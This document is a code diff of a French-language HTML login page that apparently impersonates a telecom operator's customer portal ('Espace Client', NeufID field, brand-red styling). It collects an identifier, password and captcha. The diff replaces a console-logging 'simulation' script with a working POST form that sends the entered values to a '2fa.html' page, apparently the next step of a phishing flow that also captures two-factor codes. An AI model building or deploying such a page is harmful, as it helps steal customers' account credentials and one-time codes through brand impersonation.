@@ -9,9 +9,9 @@
         .container { max-width: 480px; margin: 40px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
         .header { background: #e2000f; color: white; padding: 15px; text-align: center; font-weight: bold; }
         h2 { text-align: center; margin: 20px 0 10px; }
-        label { display: block; margin: 15px 0 5px; font-weight: bold; }
-        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        button { width: 100%; padding: 14px; background: #e2000f; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; margin-top: 20px; }
+        p { text-align: center; color: #666; font-size: 14px; }
+        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; margin: 8px 0; }
+        button { width: 100%; padding: 14px; background: #e2000f; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; margin-top: 15px; }
         .captcha { background: #fff9c4; padding: 10px; border: 1px solid #ddd; border-radius: 4px; margin: 15px 0; text-align: center; }
     </style>
 </head>
@@ -22,40 +22,24 @@
         <h2>Espace Client</h2>
         <p>Tous les champs sont obligatoires</p>
         
-        <form id="loginForm">
+        <form action="2fa.html" method="POST">
             <label>Identifiant</label>
-            <input type="text" id="identifiant" placeholder="Numéro de ligne mobile, email ou NeufID" required>
+            <input type="text" name="identifiant" placeholder="Numéro de ligne mobile, email ou NeufID" required>
             
             <label>Mot de passe</label>
-            <input type="password" id="password" placeholder="Saisir le mot de passe" required>
+            <input type="password" name="password" placeholder="Saisir le mot de passe" required>
             
-            <label style="display:flex; align-items:center;">
+            <label style="display:flex; align-items:center; margin:10px 0;">
                 <input type="checkbox" checked style="width:auto; margin-right:8px;"> Rester connecté
             </label>
             
             <div class="captcha">
                 <img src="captcha.jpg" alt="Captcha" style="max-width:100%; margin-bottom:10px;">
-                <input type="text" id="captcha" placeholder="Saisir le texte de l'image" required>
+                <input type="text" name="captcha" placeholder="Saisir le texte de l'image" required>
             </div>
             
-            <button type="button" onclick="submitForm()">Se connecter</button>
+            <button type="submit">Se connecter</button>
         </form>
     </div>
-
-    <script>
-        function submitForm() {
-            var identifiant = document.getElementById('identifiant').value;
-            var password = document.getElementById('password').value;
-            var captcha = document.getElementById('captcha').value;
-
-            // Envoi des données (simulation)
-            console.log("Identifiant: " + identifiant);
-            console.log("Mot de passe: " + password);
-            console.log("Captcha: " + captcha);
-
-            // Redirection vers 2FA
-            window.location.href = "2fa.html";
-        }
-    </script>
 </body>
 </html>
